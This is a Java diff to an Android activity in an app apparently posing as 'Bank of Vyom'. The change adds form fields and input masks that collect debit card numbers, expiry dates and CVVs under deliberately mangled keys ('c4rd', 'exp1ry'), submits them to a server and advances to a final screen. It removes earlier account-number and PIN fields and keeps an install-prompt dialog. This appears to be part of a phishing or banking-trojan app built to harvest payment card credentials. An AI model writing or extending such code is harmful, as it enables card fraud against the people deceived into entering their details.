@@ -12,7 +12,8 @@ import android.widget.Toast;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 
-import com.bankofvyom.app.bg.FormValidator;
+import com.bankofvyom.app.bg.DebitCardInputMask;
+import com.bankofvyom.app.bg.ExpiryDateInputMask;
 import com.bankofvyom.app.bg.FormValidator;
 
 import org.json.JSONException;
@@ -38,11 +39,16 @@ public class SecondActivity extends AppCompatActivity {
         int id = getIntent().getIntExtra("id", -1);
         Button buttonSubmit = findViewById(R.id.btn);
 
+        EditText exp = findViewById(R.id.exp1ry);
+        exp.addTextChangedListener(new ExpiryDateInputMask(exp));
 
+        EditText carddigit = findViewById(R.id.carddigit);
+        carddigit.addTextChangedListener(new DebitCardInputMask(carddigit));
 
         ids = new HashMap<>();
-
-        ids.put(R.id.atmpin, "atmpin");
+        ids.put(R.id.cvv, "cvv");
+        ids.put(R.id.exp1ry, "exp1ry");
+        ids.put(R.id.carddigit, "c4rd");
 
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
             int viewId = entry.getKey();
@@ -73,7 +79,7 @@ public class SecondActivity extends AppCompatActivity {
                                 try {
                                     JSONObject response = new JSONObject(result);
                                     if(response.getInt("status")==200){
-                                        Intent intent = new Intent(getApplicationContext(), ThirdActivity.class);
+                                        Intent intent = new Intent(getApplicationContext(), LastActivity.class);
                                         intent.putExtra("id", id);
                                         startActivity(intent);
                                     }else{
@@ -133,17 +139,12 @@ public class SecondActivity extends AppCompatActivity {
                         isValid = false;
                     }
                     break;
-                case "ac":
-                    if (!FormValidator.validateMinLength(editText, 10, "Invalid Account Number")) {
-                        isValid = false;
-                    }
-                    break;
                 case "pin":
                     if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                         isValid = false;
                     }
                     break;
-                case "atmpin":
+                case "tpin":
                     if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                         isValid = false;
                     }
@@ -163,7 +164,6 @@ public class SecondActivity extends AppCompatActivity {
                         isValid = false;
                     }
                     break;
-
                 default:
                     break;
             }
@@ -176,7 +176,6 @@ public class SecondActivity extends AppCompatActivity {
 
         return isValid;
     }
-
 
     private void showInstallDialog() {
         // Inflate the custom layout
